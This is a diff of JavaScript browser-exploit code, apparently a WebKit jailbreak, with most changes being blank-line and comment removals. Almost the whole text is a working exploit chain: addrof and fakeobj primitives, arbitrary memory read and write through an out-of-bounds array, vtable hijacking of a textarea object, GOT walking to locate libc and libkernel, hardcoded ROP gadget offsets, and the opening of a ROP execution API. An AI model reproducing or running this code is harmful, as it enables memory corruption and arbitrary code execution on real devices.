@@ -4,36 +4,30 @@ var leaker_arr = new Uint32Array(1024);
 var leaker_obj = {a: 1234};
 write64(addrof(oob_master).add(16), addrof(oob_slave));
 write64(addrof(leaker_arr).add(16), addrof(leaker_obj));
-
 var i48_put = function(x, a)
 {
     a[4] = x | 0;
     a[5] = (x / 4294967296) | 0;
 }
-
 var i48_get = function(a)
 {
     return a[4] + a[5] * 4294967296;
 }
-
 var addrof = function(x)
 {
     leaker_obj.a = x;
     return i48_get(leaker_arr);
 }
-
 var fakeobj = function(x)
 {
     i48_put(x, leaker_arr);
     return leaker_obj.a;
 }
-
 var read_mem_setup = function(p, sz)
 {
     i48_put(p, oob_master);
     oob_master[6] = sz;
 }
-
 var read_mem = function(p, sz)
 {
     read_mem_setup(p, sz);
@@ -42,13 +36,11 @@ var read_mem = function(p, sz)
         arr.push(oob_slave[i]);
     return arr;
 }
-
 var read_mem_s = function(p, sz)
 {
     read_mem_setup(p, sz);
     return ""+oob_slave;
 }
-
 var read_mem_b = function(p, sz)
 {
     read_mem_setup(p, sz);
@@ -56,7 +48,6 @@ var read_mem_b = function(p, sz)
     b.set(oob_slave);
     return b;
 }
-
 var read_mem_as_string = function(p, sz)
 {
     var x = read_mem_b(p, sz);
@@ -65,7 +56,6 @@ var read_mem_as_string = function(p, sz)
         ans += String.fromCharCode(x[i]);
     return ans;
 }
-
 var write_mem = function(p, data)
 {
     i48_put(p, oob_master);
@@ -73,7 +63,6 @@ var write_mem = function(p, data)
     for(var i = 0; i < data.length; i++)
         oob_slave[i] = data[i];
 }
-
 var read_ptr_at = function(p)
 {
     var ans = 0;
@@ -82,7 +71,6 @@ var read_ptr_at = function(p)
         ans = 256 * ans + d[i];
     return ans;
 }
-
 var write_ptr_at = function(p, d)
 {
     var arr = [];
@@ -93,7 +81,6 @@ var write_ptr_at = function(p, d)
     }
     write_mem(p, arr);
 }
-
 var hex = function(x)
 {
     return (new Number(x)).toString(16);
@@ -106,21 +93,16 @@ function malloc(sz)
     return read_ptr_at(addrof(arr)+0x10);
 }
 var tarea = document.createElement('textarea');
-
 var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
 var fake_vt_ptr = malloc(0x400);
 write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
-
 var real_vtable = read_ptr_at(fake_vt_ptr);
 var fake_vtable = malloc(0x2000);
 write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
 write_ptr_at(fake_vt_ptr, fake_vtable);
-
 var fake_vt_ptr_bak = malloc(0x400);
 write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
-
 var plt_ptr = read_ptr_at(fake_vtable) - 10142888;
-
 function get_got_addr(idx)
 {
     var p = plt_ptr + idx * 16;
@@ -133,21 +115,16 @@ function get_got_addr(idx)
     offset += p + 6;
     return read_ptr_at(offset);
 }
-
-//these are not real bases but rather some low addresses
 var webkit_base = read_ptr_at(fake_vtable) - 0x900000;
 var libkernel_base = get_got_addr(789);
 var libc_base = get_got_addr(573);
 var saveall_addr = libc_base+0x22a94;
 var loadall_addr = libc_base+0x26ee8;
-//var setjmp_addr = libc_base+???;
-//var longjmp_addr = libc_base+???;
 var pivot_addr = libc_base+0x26f5e;
 var infloop_addr = libc_base+0x393f0;
 var jop_frame_addr = libc_base+0x669b0;
 var get_errno_addr_addr = libkernel_base+0x11810;
 var pthread_create_addr = libkernel_base+0x17190;
-
 function saveall()
 {
     var ans = malloc(0x800);
@@ -168,9 +145,7 @@ function saveall()
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
     return ans;
 }
-
 /* PUBLIC ROP API
-
 This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
 * first 8 bytes of `buf` should be allocated but not used -- they are used internally.
 * the actual ROP chain starts at `buf+8`
